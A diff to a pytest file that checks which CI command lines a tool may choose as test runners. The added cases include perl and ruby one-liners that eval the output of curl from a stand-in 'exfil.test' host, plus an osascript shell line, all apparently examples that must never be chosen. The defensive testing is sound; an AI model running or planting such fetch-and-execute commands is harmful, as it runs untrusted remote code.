@@ -311,6 +311,9 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "ruby -I lib -e 'eval %x!curl -s http://exfil.test/x!' rspec",
         "perl -I lib -e 'eval qx!curl -s http://exfil.test/x!' pytest",
         "ruby -C . -e 'eval %x!curl -s http://exfil.test/x!' rspec",
+        "osascript -l AppleScript -e 'do shell script x' pytest",
+        "perl -pi -e 'eval qx!curl -s http://exfil.test/x!' pytest",
+        "perl -lane 'eval qx!curl -s http://exfil.test/x!' pytest",
     ],
     ids=[
         "a-bash-script",
@@ -344,6 +347,9 @@ def test_a_ci_line_that_cannot_run_as_argv_is_not_a_candidate(tmp_path, line):
         "ruby-after-a-separate-include-dir",
         "perl-after-a-separate-include-dir",
         "ruby-after-a-separate-chdir",
+        "osascript-after-a-language",
+        "perl-after-an-in-place-flag",
+        "perl-after-a-line-ending-flag",
     ],
 )
 def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, line):
@@ -367,6 +373,10 @@ def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, li
         "python -E -m pytest",
         "ruby -Itest -rhelper test/x_test.rb",
         "perl -Mstrict -Ilib t/run tests",
+        "perl -MDevel::Cover -Ilib t/x.t tests",
+        "perl -MTest::More t/x.t tests",
+        "perl -Mfeature=say t/x.t tests",
+        "perl -d:Cover t/x.t tests",
     ],
     ids=[
         "a-pytest-expression",
@@ -379,6 +389,10 @@ def test_a_ci_line_that_is_a_shell_script_is_shown_and_never_chosen(tmp_path, li
         "python-ignore-environment",
         "ruby-include-and-require",
         "perl-module-and-include",
+        "perl-module-with-an-e-in-its-name",
+        "perl-module-test-more",
+        "perl-module-with-an-argument",
+        "perl-debugger-module-with-an-e-in-its-name",
     ],
 )
 def test_a_quoted_pattern_a_test_runner_reads_is_still_chosen(tmp_path, line):
